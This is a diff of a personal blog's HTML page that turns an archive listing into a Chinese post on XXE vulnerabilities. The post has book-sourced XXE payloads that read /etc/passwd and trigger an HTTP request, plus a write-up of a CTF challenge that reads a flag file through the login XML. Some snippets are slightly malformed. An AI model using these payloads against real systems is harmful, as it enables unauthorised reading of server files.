@@ -20,17 +20,22 @@
     var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="一头努力的菜鸟">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Daq1ang">
-<meta property="og:url" content="https://jingdaqiang.github.io/archives/2021/03/page/2/index.html">
+  <meta name="description" content="《从0到1CTFer》P180:下述代码包含两段XXE常见的payload 1234567891011#coding&#x3D;utf-8import xml.saxx &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;&gt;&lt;!DOCTYPE xdse">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/03/26/XXE/index.html">
 <meta property="og:site_name" content="Daq1ang">
-<meta property="og:description" content="一头努力的菜鸟">
+<meta property="og:description" content="《从0到1CTFer》P180:下述代码包含两段XXE常见的payload 1234567891011#coding&#x3D;utf-8import xml.saxx &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;&gt;&lt;!DOCTYPE xdse">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.0.jpg">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.1.png">
+<meta property="article:published_time" content="2021-03-26T04:50:45.000Z">
+<meta property="article:modified_time" content="2021-03-26T14:14:08.994Z">
 <meta property="article:author" content="六公子买单">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.0.jpg">
 
-<link rel="canonical" href="https://jingdaqiang.github.io/archives/2021/03/page/2/">
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/03/26/XXE/">
 
 
 <script id="page-configurations">
@@ -38,12 +43,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Archive | Daq1ang</title>
+  <title>XXE漏洞 | Daq1ang</title>
   
 
 
@@ -141,114 +146,85 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">Um..! 25 posts in total. Keep on posting.</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/26/XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XXE漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-26 12:50:45 / Modified: 22:14:08" itemprop="dateCreated datePublished" datetime="2021-03-26T12:50:45+08:00">2021-03-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+        <p>《从0到1CTFer》P180:<br><img src="/2021/03/26/XXE/1.0.jpg"><br>下述代码包含两段XXE常见的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import xml.sax</span><br><span class="line"></span><br><span class="line">x &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY&gt;</span><br><span class="line">&lt;ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodoname&gt;</span><br><span class="line">&lt;&#x2F;methodcall&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>运行上面的代码就可以打印出/etc/passwd的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x1 &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;?DOCTYPE xdsec[</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:8005&#x2F;xml.test&quot;&gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;.methodname&gt;</span><br><span class="line">&lt;&#x2F;methodcall&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>运行以上代码可以收到一个HTTP请求</p>
+<p>附一篇XXE相关文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>题目暗示很明显了XXE漏洞，登录抓包.username和password都是xml格式,增加恶意实体</p>
+<p><img src="/2021/03/26/XXE/1.1.png"><br>读到了文件，读flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-03-08T10:31:31+08:00"
-              content="2021-03-08">
-          03-08
-        </time>
-      </div>
+      <footer class="post-footer">
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/03/08/buu17-32/" itemprop="url">
-            <span itemprop="name">buu-17-32</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-03-07T16:58:29+08:00"
-              content="2021-03-07">
-          03-07
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/03/07/buu1-16/" itemprop="url">
-            <span itemprop="name">buu1-16</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-03-03T20:50:21+08:00"
-              content="2021-03-03">
-          03-03
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url">
-            <span itemprop="name">命令执行</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-03-03T17:17:25+08:00"
-              content="2021-03-03">
-          03-03
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/03/03/buu-piapiapia/" itemprop="url">
-            <span itemprop="name">buu-piapiapia</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+        
 
 
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/24/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="prev" title="BJDCTF2020">
+      <i class="fa fa-chevron-left"></i> BJDCTF2020
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-  </div>
+      </footer>
+    
+  </article>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2021/03/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/archives/2021/03/">1</a><span class="page-number current">2</span>
-  </nav>
 
 
 
@@ -300,6 +276,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NCTF2019-Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">[NCTF2019]Fake XML cookbook</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
